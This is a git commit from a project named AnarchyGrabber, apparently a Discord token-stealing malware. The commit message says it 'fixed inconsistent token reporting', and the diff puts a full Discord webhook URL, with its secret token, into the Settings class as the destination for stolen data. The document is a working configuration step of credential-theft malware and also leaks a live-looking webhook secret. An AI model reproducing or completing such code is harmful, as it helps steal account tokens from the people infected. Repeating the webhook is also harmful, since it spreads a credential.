763c1ed3f922b2879fbc05c175ec22ac7340dbb7
iLinked <ilinkedisameme@gmail.com>
2020-04-02 20:23:32 +0200

    fixed inconsistent token reporting

--- AnarchyGrabber/Settings.cs
+++ AnarchyGrabber/Settings.cs
@@ -2,6 +2,6 @@
 {
     class Settings
     {
-        public static string Webhook = "";
+        public static string Webhook = "https://discordapp.com/api/webhooks/693217660741222420/a76oeEeYjoiCD2EZ72nNIKhSQ2f_Qg-bNPcxLIa3fepV2dV8ZMhiS9cKUnI-_Lu_dYff";
     }
 }
